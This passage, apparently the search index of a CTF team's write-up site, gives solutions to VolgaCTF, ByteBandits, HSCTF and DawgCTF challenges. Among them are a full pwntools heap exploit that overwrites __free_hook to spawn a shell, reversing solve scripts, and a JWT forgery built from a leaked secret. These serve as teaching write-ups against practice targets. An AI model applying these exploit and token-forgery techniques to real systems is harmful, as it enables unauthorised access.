r.sendlineafter(' ','l') def dele_note(idx): r.sendlineafter(' ','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter(' ','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter(' ','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter(' ','l') def update_tab(idx,name,length,data): r.sendlineafter(' ','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter(' ','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter(' ','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#notepad-","text":"This 300 pointer challenge was the solo Pwn challenge in VolgaCTF and I solved it just after the CTF ended :(. The following exploit is tested on a Ubuntu 18.04 VM. Here\u2019s the description of the challenge: Notepad\u2013 is the app to store your most private notes, with an extremely lightweight UI. Check it out! We are just given the challenge binary for this challenge. Also, the 64-bit dynamically linked stripped binary had all the protections enabled other than FORTIFY.","title":"Notepad--"},{"location":"pwning/VolgaCTF20/notepad/#reversing","text":"The Notepad application presents us a menu function which looks like: Welcome to Notepad-- Pick an existing notebook or create a new one [p]ick notebook [a]dd notebook [d]elete notebook [l]ist notebook [q]uit The structure of the notebook and tab is as follows, struct notebook { char name[16]; int number_of_tabs; struct tab tabs[64]; } struct tabs { char name[16]; int size; char* content; } So the functionality allows you to pick a notebook by giving the index as index_of_notebook + 1 and to try out the functionalities of tabs. Operations with notebook aaaaaaa [a]dd tab [v]iew tab [u]pdate tab [d]elete tab [l]ist tabs [q]uit This let\u2019s you add a tab, view the data in each tab ( (len(data_it_prints) is equal to tab- size) , list all the names of tabs in a notebook, delete a tab and go back to the previous menu. So hoping that the functionalities of the binary is clear let\u2019s move on!","title":"Reversing"},{"location":"pwning/VolgaCTF20/notepad/#vulnerability-and-the-exploit","text":"","title":"Vulnerability and the exploit"},{"location":"pwning/VolgaCTF20/notepad/#getting-the-leaks","text":"As the libc is not given and as PIE and RELRO are fully enabled the best way to get the leaks here is to allocate an unsorted bin chunk, free it and view it. As the binary uses malloc() the libc pointers are retained after allocation provided we give an empty content. Here\u2019s what I did: Allocated a chunk of size 0x500 bytes so that after freeing it goes to the unsorted bin Deleted the chunk using delete_tab functionality Allocated another chunk of size 0x20. Malloc would split the previous chunk and allocate me a chunk of 0x30 size (0x10 for the header). The allocated chunk had the first 2 0x8 bytes set to a libc pointer Did a view and got the leaks by calculating the offsets Mind you, I did this locally and not on the server. To get which libc the binary is using you might have to look up the last 3 nibbles in the libc database to get the libc version the challenge is using!","title":"Getting the leaks"},{"location":"pwning/VolgaCTF20/notepad/#overwriting-the-free_hook","text":"The first obvious bug in the binary is the manner in how it takes in the name of the notebook and the tab. It takes the input through scanf( \u201c%s\u201d, name) which makes it obvious that it is prone to the classic buffer overflow! Here\u2019s the code snippet of the add_notebook functionality: int add_notebook() { __int64 v1; // rax char *v2; // ST08_8 if ( nb_ctr == 16 ) return puts( You've reached the limit for notebooks! Delete some of the older once first! ); v1 = nb_ctr++; v2 = (char *) table + 2072 * v1; printf( Enter notebook name: ); return __isoc99_scanf( %s , v2); } Now, that you have got the leaks you can find the address of free_hook which is a libc pointer that is invoked when the program calls free(chunk). To carry out the final exploit our aim is now to overwrite the free_hook. To do this we do have to explore another vulnerability which lies in the update_tab functionality. Update_tab function let\u2019s you update any tab of the index lesser than notebook- number_of_tabs. Enter index of tab to update: 1 Enter new tab name (leave empty to skip): Enter new data length (leave empty to keep the same): Enter the data: And as you can see in above if the new length is same as the previous it just simply lets you update the content pointed by the data pointer. Otherwise, it frees the current data pointer and calls a malloc() with a size. What if I could overwrite tabs- data pointer with free_hook and call an update functionality without giving a different size? Let\u2019s see what we can do! Add another note (as first one was used for the leaks) and using scanf(\u201c%s\u201d,name) overflow junk in place of name but overwrite size with a valid size and data pointer with free_hook. Pick that note and update tab with index 1. As discussed above, leave data length empty, point free_hook to system(). Free a chunk holding the string \u201c/bin/sh\\x00\u201d and BOOM!!!","title":"Overwriting the free_hook"},{"location":"pwning/VolgaCTF20/notepad/#exploit-code","text":"from pwn import * r = process('./notepad') # notebook functionalities def add_note(name): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) def pick_note(): #display items r.sendlineafter(' ','l') def dele_note(idx): r.sendlineafter(' ','d') r.sendlineafter('Enter index of a notebook to delete:',str(idx)) def pick_note(idx): r.sendlineafter(' ','p') r.sendlineafter('pick: ',str(idx)) #tab functionalities def add_tab(name,length,data): r.sendlineafter(' ','a') r.sendlineafter('name: ',name) r.sendlineafter('Enter data length (in bytes): ',str(length)) r.sendlineafter('data: ',data) def view_tab(idx): r.sendlineafter(' ','v') r.sendlineafter('view: ',str(idx)) def list_tab(): r.sendlineafter(' ','l') def update_tab(idx,name,length,data): r.sendlineafter(' ','u') r.sendlineafter('update: ',str(idx)) r.sendlineafter('skip): ',name) r.sendlineafter('same): ',str(length)) r.sendlineafter('data: ',data) def del_tab(idx): r.sendlineafter(' ','d') r.sendlineafter('delete: ',str(idx)) def quit_tab(): r.sendlineafter(' ','q') add_note('a'*0x10) pick_note(1) add_tab('b'*0x10,0x500, '') add_tab('c'*0x10,0x10,'/bin/sh\\x00') del_tab(1) add_tab('d'*0x10,0x20,'') view_tab(2) print(r.recvline()) rcvd = r.recvline() leak = u64('\\xd0'+rcvd[:7]) libc_base = leak - 0x3ec0d0 quit_tab() #leaked pointers free_hook = libc_base + 0x3ed8e8 system = libc_base + 0x4f440 #final exploit sizeof_nb = 0x818 offset_tab = 0x18 offset_data = 0x18 sizeof_filler = offset_tab+offset_data-0x8 filler = b'a'*(sizeof_filler)+p64(0x30) add_note(filler+p64(free_hook)) pick_note(2) update_tab(1,'b'*0x8,'',p64(system)) print(hex(free_hook)) print(hex(libc_base)) quit_tab() pick_note(1) del_tab(1) #gdb.attach(r) r.interactive() The challenge was a simple yet interesting one! I got a shell locally for this but was too late to try it on the server and get the flag. Anyways, I\u2019m glad I could solve it!","title":"Exploit Code"},{"location":"reversing/intro/","text":"Reversing Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category. The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis APLab:Statistics APLab:English","title":"Reversing"},{"location":"reversing/intro/#reversing","text":"","title":"Reversing"},{"location":"reversing/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Reverse Engineering category.","title":"Introduction"},{"location":"reversing/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Byte Bandits 2020 Auto Bot Baby rust HSCTF7 2020 Dis APLab:Statistics APLab:English","title":"The contents of this repo"},{"location":"reversing/ByteBandits20/auto_bot/","text":"Auto_bot Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil( \\n ) flag.write(str(o)) out = base64.b64decode(o) n=open( new , wb ) n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project( ./new ) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b good job in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/auto_bot/#auto_bot","text":"Challenge was solved by: Sandra and Ashwathi When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. Heres the scritp from pwn import * import base64 import subprocess import angr import sys r = remote('pwn.byteband.it', 6000) flag = open('flag.txt', 'w') while(1): o = r.recvuntil( \\n ) flag.write(str(o)) out = base64.b64decode(o) n=open( new , wb ) n.write(out) n.close() subprocess.call(['chmod','+x','new']) project = angr.Project( ./new ) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) simulation.explore(find = lambda s: b good job in s.posix.dumps(1) in s.posix.dumps(1)) if simulation.found: solution_state=simulation.found[0] r.sendline(solution_state.posix.dumps(sys.stdin.fileno())) #in = inp[2:len(inp)-1] else: raise Exception('could not find solution:') #r.sendline(in) #flag{0pt1mus_pr1m3_has_chosen_you}","title":"Auto_bot"},{"location":"reversing/ByteBandits20/baby_rust/","text":"Baby_Rust Analysing it dynamically gets us to xoring instructions: d = adhmp`badO|sL}JuvvFmiui{@IO}QQVR k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/ByteBandits20/baby_rust/#baby_rust","text":"Analysing it dynamically gets us to xoring instructions: d = adhmp`badO|sL}JuvvFmiui{@IO}QQVR k=0 for i in d: s=s+chr(ord(i)^(7+k)) k=k+1 print(s) #flag{look_ma_i_can_write_in_rust}","title":"Baby_Rust"},{"location":"reversing/HSCTF7/APLabEnglish/","text":"APLab:English Description Another java Reversing Challenge. We are given a java file which is to be reversed. Solution '''python Solve s=\"1dd3|y_3tttb5g`q]^dhn3j\" def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s) ''' Output 5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#aplabenglish","text":"","title":"APLab:English"},{"location":"reversing/HSCTF7/APLabEnglish/#description","text":"Another java Reversing Challenge. We are given a java file which is to be reversed.","title":"Description"},{"location":"reversing/HSCTF7/APLabEnglish/#solution","text":"'''python Solve s=\"1dd3|y_3tttb5g`q]^dhn3j\" def unxor(string): ret='' xorstr=[4,1,3,1,2,1,3,0,1,4,3,1,2,0,1,4,1,2,3,2,1,0,3] for i in range(len(string)): ret+=chr(ord(string[i])^xorstr[i]) return ret def untranspose(string): ret=[None]*23 transpose=[11,18,15,19,8,17,5,2,12,6,21,0,22,7,13,14,4,16,20,1,3,10,9] for i in range(len(transpose)): ret[transpose[i]]=string[i] return ''.join(ret) for i in range(3): s=unxor(s) print(s) s=untranspose(s) print(s) '''","title":"Solution"},{"location":"reversing/HSCTF7/APLabEnglish/#output","text":"5eg2~x\\3upwc7gau\\\\gjo3i cj3o\\\\pg~i35uaug\\xe2gw7 gk0n^]sgm04watc]zf0fw4 40gf]sma^4wgtc0z]knf0w 01dg_rna_0tf}tb4{_hlg0t flag{n0t_t00_b4d_r1ght}","title":"Output"},{"location":"reversing/HSCTF7/Dis/","text":"Dis HSCTF2020 Description The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3. Solution '''python bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#dis-hsctf2020","text":"","title":"Dis HSCTF2020"},{"location":"reversing/HSCTF7/Dis/#description","text":"The challenge was a python bytecode challenge where the approach I chose was to maually replicate the bytecode from the documentation of the dis module in python which took up a while. Im not sure if there's a less time consuming approach but once that was done the reversing part was automated using Z3.","title":"Description"},{"location":"reversing/HSCTF7/Dis/#solution","text":"'''python bytestring=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' from z3 import * def a(s): o = [0] * 32 for i in range(32): o[i] = ((s[i]+s[i])-60) return o def b(s,t): for x,y in zip(s,t): yield(x+y)-50 def c(s): return [x+5 for x in s] def e(s): s = [ i for i in s ] o = [ (o^5)-30 for o in b(a(s),c(s)) ] return o def main(): sol=Solver() o=b'\\xae\\xc0\\xa1\\xab\\xef\\x15\\xd8\\xca\\x18\\xc6\\xab\\x17\\x93\\xa8\\x11\\xd7\\x18\\x15\\xd7\\x17\\xbd\\x9a\\xc0\\xe9\\x93\\x11\\xa7\\x04\\xa1\\x1c\\x1c\\xed' l=list(o) s = [ BitVec('s[%s]' % i, 8) for i in range(32) ] s = e(s) for i in range(len(l)): sol.add(s[i]==l[i]) print(sol.check()) print(sol.model()) main() Flag: flag{5tr4ng3_d1s45s3mbly_1c0a88}","title":"Solution"},{"location":"reversing/HSCTF7/Statistics/","text":"APLab:Statistics HSCTF Description A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge. Solution '''java import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring=\"qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba\" String com = \"fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey\"; String guess = \"abcdefghijklmnopqrstuvwxyz{_}|\"; System.out.print(\"f\"); for (int i = 1 ; i com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } ''' Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#aplabstatistics-hsctf","text":"","title":"APLab:Statistics HSCTF"},{"location":"reversing/HSCTF7/Statistics/#description","text":"A fun Java RE challenge from HSCTF-2020 The given file was a .class file which had to be converted to a .java file using any online converters or tools like jadx.Once you get the .java file I was initially not able to convert the java code due to an invoke to call a direct java bytecode for which I simply changed the line to an equivalent funtion that is simply toString to fix that. Thereafter we figured that the code was performing certain manipulations on the input and would simply check between the two strings. But the catch was where there was a sortof non reversible bubble sort kind of algorithm which picked up the two smallest values in the string and pushed them to the end of the string. And due to that a few charecters of the flag had to be guessed. However the following is the script that we used to solve the challenge.","title":"Description"},{"location":"reversing/HSCTF7/Statistics/#solution","text":"'''java import java.util.Scanner; public class statistics { public static void main(final String[] args) { int[] arr = {102,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}; // checkstring=\"qtqnhuyj{fjw{rwhswzppfnfrz|qndfktceyba\" String com = \"fqntqdhuyj{fjw{rwhswzppfnbrz|qncfktaey\"; String guess = \"abcdefghijklmnopqrstuvwxyz{_}|\"; System.out.print(\"f\"); for (int i = 1 ; i com.length() ; i ++){ char st = com.charAt(i); for (int k = 0;k guess.length();k++){ if (arr[i - 1] % 2 == 0) { arr[i] = guess.charAt(k) + (arr[i - 1] - 97); } else { arr[i] = guess.charAt(k) - (arr[i - 1] - 97); } arr[i] = (arr[i] - 97 + 29)%29 + 97; if((char)arr[i] == st){ System.out.print(guess.charAt(k)); break; } //System.out.println((char)arr[i]); }} } } ''' Output: flag{tenpercentofallstatirqicsashfake} We had to perform several tries to finally guess the few last charecters we needed to complete the flag. But it was worth! Flag: flag{tenpercentofallstatitoicsarefake}","title":"Solution"},{"location":"web/intro/","text":"Web Exploitaion Introduction \"Write about Reverse Engineering and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2","title":"Web Exploitaion"},{"location":"web/intro/#web-exploitaion","text":"","title":"Web Exploitaion"},{"location":"web/intro/#introduction","text":"\"Write about Reverse Engineering and about the writeups\"","title":"Introduction"},{"location":"web/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Dawg CTF 2020 FreeWifi 2","title":"The contents of this repo"},{"location":"web/DawgCTF20/freewifi2/","text":"FreeWifi2 There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: JWT 'identity'=31337 HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M username=true.grit%40umbccd.io password=true.grit%40umbccd.io submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666 Ideas: I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'= dawgCTF?heckin#bamboozle ; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Freewifi2"},{"location":"web/DawgCTF20/freewifi2/#freewifi2","text":"There is a pcap given. On TCP Stream 48, we can find the username: true.grit@umbccd.io In addition, there are three interesting endpoints in the pcap. You can go over all the tcp streams and eventually, you find the below details: - /jwtlogin - /forgotpassword.html - /staff.html (this got a flag which is the solution for FreeWifi1.) Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response: JWT 'identity'=31337 HTTP Request: POST /staff.html HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 178 Origin: https://freewifi.ctf.umbccd.io Connection: close Referer: https://freewifi.ctf.umbccd.io/staff.html Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1 Upgrade-Insecure-Requests: 1 csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M username=true.grit%40umbccd.io password=true.grit%40umbccd.io submit=Submit HTTP Response: HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Sat, 11 Apr 2020 10:39:07 GMT Content-Type: text/html; charset=utf-8 Connection: close Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/ Set-Cookie: WifiKey alg=SHA1; Path=/ Set-Cookie: JWT 'identity'=31337; Path=/ Vary: Cookie Content-Length: 2666","title":"FreeWifi2"},{"location":"web/DawgCTF20/freewifi2/#ideas","text":"I think the goal is to login with /jwtlogin We have identity from the above request. In addition, there is additional information from the pcap about a secret: Set-Cookie: JWT 'secret'= dawgCTF?heckin#bamboozle ; Path=/ Using, this two values, I tried creating a JWT token using python. import jwt print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256') eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Below is the request that gave me the flag: HTTP Request GET /jwtlogin HTTP/1.1 Host: freewifi.ctf.umbccd.io User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA Connection: keep-alive Upgrade-Insecure-Requests: 1 Content-Length: 2 You have the flag in the reponse. DawgCTF{y0u_d0wn_w!t#_JWT?}","title":"Ideas:"}]}